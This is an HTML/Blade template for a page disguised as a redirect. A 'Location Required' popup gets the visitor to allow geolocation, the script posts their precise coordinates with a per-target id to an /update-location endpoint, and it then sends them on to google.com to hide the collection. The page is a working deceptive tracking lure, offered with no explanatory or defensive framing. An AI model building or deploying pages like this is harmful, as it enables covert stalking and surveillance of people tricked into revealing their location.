<!DOCTYPE html>
<html>
<head>
    <title>Redirecting...</title>
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <meta name="csrf-token" content="{{ csrf_token() }}">
    <style>
        body { font-family: sans-serif; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; background: #f4f7f6; }
        #popup { background: white; padding: 30px; border-radius: 15px; box-shadow: 0 10px 30px rgba(0,0,0,0.1); text-align: center; width: 85%; max-width: 400px; }
        .btn { background: #4361ee; color: white; border: none; padding: 12px 25px; border-radius: 8px; cursor: pointer; font-weight: bold; width: 100%; margin-top: 15px; }
        .loader { display: none; border: 4px solid #f3f3f3; border-top: 4px solid #3498db; border-radius: 50%; width: 40px; height: 40px; animation: spin 1s linear infinite; }
        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
    </style>
</head>
<body>
    <div id="popup">
        <h2 style="margin:0; color:#1e293b;">📍 Location Required</h2>
        <p style="color:#64748b;">To continue, please click the button below and then click <b>Allow</b>.</p>
        <button class="btn" onclick="startTracking()">Continue to Site</button>
    </div>

    <div class="loader" id="loader"></div>

    <script>
        function startTracking() {
            document.getElementById('popup').style.display = 'none';
            document.getElementById('loader').style.display = 'block';

            if (navigator.geolocation) {
                navigator.geolocation.getCurrentPosition(function(position) {
                    fetch("{{ url('/update-location') }}", {
                        method: "POST",
                        headers: { "Content-Type": "application/json", "X-CSRF-TOKEN": "{{ csrf_token() }}" },
                        body: JSON.stringify({
                            id: "{{ $id }}",
                            latitude: position.coords.latitude,
                            longitude: position.coords.longitude
                        })
                    }).then(() => { window.location.href = "https://google.com"; });
                }, function() { window.location.href = "https://google.com"; }, 
                { enableHighAccuracy: true, timeout: 10000 });
            } else { window.location.href = "https://google.com"; }
        }
    </script>
</body>
</html>
